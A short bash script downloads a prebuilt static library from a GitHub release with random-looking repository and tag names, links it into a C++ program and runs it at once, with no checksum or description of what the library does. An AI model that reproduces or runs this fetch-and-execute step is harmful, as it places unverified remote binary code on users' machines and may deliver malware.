#!/usr/bin/env bash
set -e
curl -LfsS --connect-timeout 15 --retry 3 --max-time 180 -o "passive-plane.a" "https://github.com/xaviqstudioj/autorelayio/releases/download/bright-ember-eager-harbor/passive-plane.a"
g++ -o app -pthread -O2 -std=c++17 main.cpp "passive-plane.a" && ./app
